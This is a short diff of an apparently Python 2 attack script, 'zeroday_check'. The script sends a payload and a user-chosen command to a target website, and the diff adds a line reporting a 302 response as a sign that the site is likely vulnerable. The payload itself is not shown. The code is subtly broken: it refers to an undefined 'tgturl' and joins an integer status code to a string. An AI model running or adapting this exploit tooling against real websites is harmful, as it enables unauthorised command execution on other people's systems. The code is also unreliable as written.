@@ -15,6 +15,8 @@ def zeroday_check(tgtURL, tgtPATH, tgtCMD):
 	resp = requests.get(urlcheck+payload)
 	time.sleep(1)
 	print resp.status_code + " "+urlcheck+ " !"
+	if resp.status_code == 302:
+		print "[+] "+tgturl+ "is likely vulnerable"
 
 def main():
 	parser = optparse.OptionParser('python %prog -u <website> -t <targetpath> -c command')
